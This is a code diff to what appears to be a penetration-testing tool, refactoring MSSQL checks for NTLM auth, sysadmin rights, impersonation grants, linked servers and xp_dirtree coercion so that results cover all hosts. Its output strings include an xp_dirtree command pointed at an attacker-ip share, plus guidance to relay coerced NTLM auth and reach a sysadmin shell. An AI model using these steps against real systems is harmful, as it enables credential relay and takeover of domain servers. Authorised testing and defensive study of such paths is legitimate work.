@@ -175,6 +175,8 @@ class MssqlWindowsAuthCheck(BaseCheck):
     name = "MSSQL accepts Windows/NTLM authentication"
 
     def _run(self) -> CheckResult:
+        passed, cred_rejected, ambiguous = [], [], []
+
         for host in self.env.mssql_targets():
             if not _port_open(host, 1433, timeout=self.env.timeout):
                 continue
@@ -185,32 +187,43 @@ class MssqlWindowsAuthCheck(BaseCheck):
             if rc == -1:
                 return CheckResult(name=self.name, status=Status.SKIP,
                                    detail="nxc not available.")
-
             if "[+]" in out:
-                return CheckResult(
-                    name=self.name, status=Status.PASS,
-                    detail=f"Windows/NTLM auth accepted on {host}.",
-                )
-            if "status_logon_failure" in combined or "login failed" in combined:
-                return CheckResult(
-                    name=self.name, status=Status.WARN,
-                    detail=(
-                        f"Windows auth enabled on {host} but credentials rejected. "
-                        "Relay may still work — the relayed account needs SQL access, "
-                        "not necessarily the enumeration account."
-                    ),
-                )
-            if rc != -1:
-                return CheckResult(
-                    name=self.name, status=Status.WARN,
-                    detail=(
-                        f"MSSQL reachable on {host}, Windows auth attempted. "
-                        f"Could not confirm result — try manually: "
-                        f"`nxc mssql {host} -u <user> -p <pass> -d <domain>`"
-                    ),
-                    raw=out[:300],
-                )
+                passed.append(host)
+            elif "status_logon_failure" in combined or "login failed" in combined:
+                cred_rejected.append(host)
+            elif rc != -1:
+                ambiguous.append(host)
 
+        if passed:
+            extra = ""
+            if cred_rejected:
+                extra += (f" (credentials rejected on {', '.join(cred_rejected)}"
+                          " — relay account may still work there)")
+            if ambiguous:
+                extra += f" (result unclear on {', '.join(ambiguous)})"
+            return CheckResult(
+                name=self.name, status=Status.PASS,
+                detail=f"Windows/NTLM auth accepted on {', '.join(passed)}.{extra}",
+            )
+        if cred_rejected:
+            return CheckResult(
+                name=self.name, status=Status.WARN,
+                detail=(
+                    f"Windows auth enabled on {', '.join(cred_rejected)} but "
+                    "credentials rejected. Relay may still work — the relayed "
+                    "account needs SQL access, not necessarily the enumeration account."
+                ),
+            )
+        if ambiguous:
+            hosts_str = ", ".join(ambiguous)
+            return CheckResult(
+                name=self.name, status=Status.WARN,
+                detail=(
+                    f"MSSQL reachable on {hosts_str}, Windows auth attempted. "
+                    f"Could not confirm result — try manually: "
+                    f"`nxc mssql {hosts_str} -u <user> -p <pass> -d <domain>`"
+                ),
+            )
         return CheckResult(
             name=self.name, status=Status.SKIP,
             detail="No MSSQL targets reachable on port 1433.",
@@ -233,6 +246,8 @@ class MssqlPrivilegeCheck(BaseCheck):
     required = False
 
     def _run(self) -> CheckResult:
+        sysadmin_hosts, not_sysadmin_hosts = [], []
+
         for host in self.env.mssql_targets():
             if not _port_open(host, 1433, timeout=self.env.timeout):
                 continue
@@ -247,24 +262,31 @@ class MssqlPrivilegeCheck(BaseCheck):
                 return CheckResult(name=self.name, status=Status.SKIP,
                                    detail="nxc not available.")
 
-            combined = out + err
-            # nxc output: "is_sysadmin:1" or "is_sysadmin:0"
-            m = re.search(r"is_sysadmin:(\d)", combined)
+            m = re.search(r"is_sysadmin:(\d)", out + err)
             if m:
                 if m.group(1) == "1":
-                    return CheckResult(
-                        name=self.name, status=Status.PASS,
-                        detail=f"Account has direct sysadmin role on {host} — relay gives immediate xp_cmdshell.",
-                    )
+                    sysadmin_hosts.append(host)
                 else:
-                    return CheckResult(
-                        name=self.name, status=Status.FAIL,
-                        detail=(
-                            f"Account is NOT direct sysadmin on {host}. "
-                            "Check impersonation paths below — may still reach sysadmin via EXECUTE AS."
-                        ),
-                    )
+                    not_sysadmin_hosts.append(host)
 
+        if sysadmin_hosts:
+            extra = (f" Not sysadmin on: {', '.join(not_sysadmin_hosts)}."
+                     if not_sysadmin_hosts else "")
+            return CheckResult(
+                name=self.name, status=Status.PASS,
+                detail=(
+                    f"Account has direct sysadmin role on {', '.join(sysadmin_hosts)}"
+                    f" — relay gives immediate xp_cmdshell.{extra}"
+                ),
+            )
+        if not_sysadmin_hosts:
+            return CheckResult(
+                name=self.name, status=Status.FAIL,
+                detail=(
+                    f"Account is NOT direct sysadmin on {', '.join(not_sysadmin_hosts)}. "
+                    "Check impersonation paths below — may still reach sysadmin via EXECUTE AS."
+                ),
+            )
         return CheckResult(
             name=self.name, status=Status.SKIP,
             detail="Could not check sysadmin privilege — auth may have failed.",
@@ -304,11 +326,15 @@ class MssqlImpersonationCheck(BaseCheck):
     )
 
     def _run(self) -> CheckResult:
+        # Collect per-host results then aggregate so all hosts are covered.
+        sysadmin_findings = []   # list of (host, [path_str, ...])
+        other_findings    = []   # list of (host, [pair_str, ...])
+        no_impersonate    = []   # hosts where auth worked but no grants found
+
         for host in self.env.mssql_targets():
             if not _port_open(host, 1433, timeout=self.env.timeout):
                 continue
 
-            # Step 1: get impersonation grants
             rc, out, err = _run_nxc_mssql(
                 _nxc_base_args(host, self.env) + ["-q", self.IMPERSONATE_QUERY],
                 self.env, timeout=20,
@@ -318,67 +344,81 @@ class MssqlImpersonationCheck(BaseCheck):
                                    detail="nxc not available.")
 
             combined = out + err
-            can_impersonate = re.findall(r"who_can_impersonate:([^\r\n]+)", combined)
+            can_impersonate  = re.findall(r"who_can_impersonate:([^\r\n]+)", combined)
             gets_impersonated = re.findall(r"who_gets_impersonated:([^\r\n]+)", combined)
 
             if not can_impersonate:
                 if "[+]" in out:
-                    return CheckResult(
-                        name=self.name, status=Status.FAIL,
-                        detail=f"No IMPERSONATE grants found on {host}.",
-                    )
-                return CheckResult(
-                    name=self.name, status=Status.SKIP,
-                    detail="Could not query impersonation rights — auth may have failed.",
-                )
+                    no_impersonate.append(host)
+                # else auth failed — skip this host silently
+                continue
 
             pairs = list(zip(
                 [w.strip() for w in can_impersonate],
                 [t.strip() for t in gets_impersonated],
             ))
 
-            # Step 2: look up actual sysadmin accounts — no hardcoding
-            sysadmin_accounts: set[str] = {"sa"}  # sa is always sysadmin
+            # Look up actual sysadmin accounts on this host
+            sysadmin_accounts: set = {"sa"}
             rc2, out2, _ = _run_nxc_mssql(
                 _nxc_base_args(host, self.env) + ["-q", self.SYSADMIN_LIST_QUERY],
                 self.env, timeout=20,
             )
             if rc2 != -1 and "[+]" in out2:
-                for m in re.finditer(r"[\s]name:([^\s\r\n()]+)", out2):
-                    # store both full "DOMAIN\\user" and just "user" for flexible matching
-                    full = m.group(1).strip().lower()
+                for m2 in re.finditer(r"[\s]name:([^\s\r\n()]+)", out2):
+                    full = m2.group(1).strip().lower()
                     sysadmin_accounts.add(full)
                     sysadmin_accounts.add(full.split("\\")[-1])
 
-            # Classify impersonation pairs
-            sysadmin_paths = [
-                (who, target) for who, target in pairs
-                if target.lower() in sysadmin_accounts
-                or target.lower().split("\\")[-1] in sysadmin_accounts
+            sa_paths = [
+                (w, t) for w, t in pairs
+                if t.lower() in sysadmin_accounts
+                or t.lower().split("\\")[-1] in sysadmin_accounts
             ]
-            other_paths = [(w, t) for w, t in pairs if (w, t) not in sysadmin_paths]
+            other_paths = [(w, t) for w, t in pairs if (w, t) not in sa_paths]
 
-            if sysadmin_paths:
-                sysadmin_strs = [f"{w} -> {t}" for w, t in sysadmin_paths]
-                extra = (f" (other grants: {', '.join(f'{w} -> {t}' for w,t in other_paths)})"
-                         if other_paths else "")
-                return CheckResult(
-                    name=self.name, status=Status.PASS,
-                    detail=(
-                        f"Impersonation path(s) to sysadmin on {host}: "
-                        f"{'; '.join(sysadmin_strs)}.{extra} "
-                        "Relay any left-hand account then EXECUTE AS LOGIN for sysadmin shell."
-                    ),
+            if sa_paths:
+                sysadmin_findings.append(
+                    (host, [f"{w} -> {t}" for w, t in sa_paths],
+                     [f"{w} -> {t}" for w, t in other_paths])
+                )
+            else:
+                other_findings.append(
+                    (host, [f"{w} -> {t}" for w, t in pairs])
                 )
 
-            pair_strs = [f"{w} -> {t}" for w, t in pairs]
+        if sysadmin_findings:
+            parts = []
+            for host, sa_strs, other_strs in sysadmin_findings:
+                extra = (f" (other: {', '.join(other_strs)})" if other_strs else "")
+                parts.append(f"{host}: {'; '.join(sa_strs)}{extra}")
+            no_imp_note = (f" No impersonation grants on: {', '.join(no_impersonate)}."
+                           if no_impersonate else "")
+            return CheckResult(
+                name=self.name, status=Status.PASS,
+                detail=(
+                    f"Impersonation path(s) to sysadmin — {' | '.join(parts)}. "
+                    f"Relay any left-hand account then EXECUTE AS LOGIN for sysadmin shell.{no_imp_note}"
+                ),
+            )
+        if other_findings:
+            parts = [f"{h}: {', '.join(strs)}" for h, strs in other_findings]
             return CheckResult(
                 name=self.name, status=Status.WARN,
                 detail=(
-                    f"Impersonation grants exist on {host}: {'; '.join(pair_strs)}. "
-                    "None map to confirmed sysadmin accounts — verify manually."
+                    f"Impersonation grants exist but none map to confirmed sysadmin — "
+                    f"{' | '.join(parts)}. Verify manually."
                 ),
             )
+        if no_impersonate:
+            return CheckResult(
+                name=self.name, status=Status.FAIL,
+                detail=f"No IMPERSONATE grants found on {', '.join(no_impersonate)}.",
+            )
+        return CheckResult(
+            name=self.name, status=Status.SKIP,
+            detail="Could not query impersonation rights — auth may have failed.",
+        )
 
 
 class MssqlLinkedServerCheck(BaseCheck):
@@ -395,6 +435,9 @@ class MssqlLinkedServerCheck(BaseCheck):
     required = False
 
     def _run(self) -> CheckResult:
+        found: dict = {}   # host -> [linked_server_names]
+        no_links: list = []
+
         for host in self.env.mssql_targets():
             if not _port_open(host, 1433, timeout=self.env.timeout):
                 continue
@@ -410,33 +453,36 @@ class MssqlLinkedServerCheck(BaseCheck):
                                    detail="nxc not available.")
 
             combined = out + err
-
-            # nxc output: "name:BRAAVOS" (one per linked server)
-            # nxc query result lines end with "name:BRAAVOS" as the last field.
-            # nxc header lines contain (name:CASTELBLACK) inside parentheses — skip those.
             linked_names = []
             for line in combined.splitlines():
-                if any(m in line for m in ("[*]", "[-]", "Build", "SMBv1")):
+                if any(tok in line for tok in ("[*]", "[-]", "Build", "SMBv1")):
                     continue
                 m = re.search(r"[\s]name:([^\s\r\n()]+)\s*$", line)
                 if m:
                     linked_names.append(m.group(1).strip())
 
-            if linked_names and "[+]" in out:
-                return CheckResult(
-                    name=self.name, status=Status.PASS,
-                    detail=(
-                        f"Linked server(s) on {host}: {', '.join(linked_names)}. "
-                        "May allow lateral movement — check linked server login mapping."
-                    ),
-                )
-
             if "[+]" in out:
-                return CheckResult(
-                    name=self.name, status=Status.FAIL,
-                    detail=f"No linked servers found on {host}.",
-                )
+                if linked_names:
+                    found[host] = linked_names
+                else:
+                    no_links.append(host)
 
+        if found:
+            parts = [f"{h}: {', '.join(names)}" for h, names in found.items()]
+            extra = (f" No linked servers on: {', '.join(no_links)}."
+                     if no_links else "")
+            return CheckResult(
+                name=self.name, status=Status.PASS,
+                detail=(
+                    f"Linked server(s) found — {'; '.join(parts)}. "
+                    f"May allow lateral movement — check linked server login mapping.{extra}"
+                ),
+            )
+        if no_links:
+            return CheckResult(
+                name=self.name, status=Status.FAIL,
+                detail=f"No linked servers found on {', '.join(no_links)}.",
+            )
         return CheckResult(
             name=self.name, status=Status.FAIL,
             detail="No linked servers found or query failed.",
@@ -537,6 +583,8 @@ class MssqlXpDirtreeCoercionCheck(BaseCheck):
     required = False
 
     def _run(self) -> CheckResult:
+        available, unavailable = [], []
+
         for host in self.env.mssql_targets():
             if not _port_open(host, 1433, timeout=self.env.timeout):
                 continue
@@ -549,24 +597,32 @@ class MssqlXpDirtreeCoercionCheck(BaseCheck):
                                    detail="nxc not available.")
 
             if "[+]" in out:
-                return CheckResult(
-                    name=self.name, status=Status.PASS,
-                    detail=(
-                        f"SQL access confirmed on {host} — xp_dirtree coercion available. "
-                        "Execute: `EXEC master.sys.xp_dirtree '\\\\<attacker-ip>\\demontlm',1,1` "
-                        "to coerce the SQL service account into authenticating. "
-                        "Relay that auth to LDAP/ADCS — no WebClient or PrinterBug needed."
-                    ),
-                )
-            if "status_logon_failure" in (out + err).lower():
-                return CheckResult(
-                    name=self.name, status=Status.FAIL,
-                    detail=(
-                        f"SQL auth failed on {host} — xp_dirtree coercion not available "
-                        "with this account. Gain any SQL access first."
-                    ),
-                )
+                available.append(host)
+            elif "status_logon_failure" in (out + err).lower():
+                unavailable.append(host)
 
+        if available:
+            extra = (f" Auth failed on {', '.join(unavailable)} — no xp_dirtree there."
+                     if unavailable else "")
+            return CheckResult(
+                name=self.name, status=Status.PASS,
+                detail=(
+                    f"SQL access confirmed on {', '.join(available)} — "
+                    "xp_dirtree coercion available. "
+                    "Execute: `EXEC master.sys.xp_dirtree \'\\\\<attacker-ip>\\demontlm\',1,1` "
+                    "to coerce the SQL service account into authenticating. "
+                    f"Relay that auth to LDAP/ADCS — no WebClient or PrinterBug needed.{extra}"
+                ),
+            )
+        if unavailable:
+            return CheckResult(
+                name=self.name, status=Status.FAIL,
+                detail=(
+                    f"SQL auth failed on {', '.join(unavailable)} — "
+                    "xp_dirtree coercion not available with this account. "
+                    "Gain any SQL access first."
+                ),
+            )
         return CheckResult(
             name=self.name, status=Status.SKIP,
             detail="No MSSQL targets reachable on port 1433.",
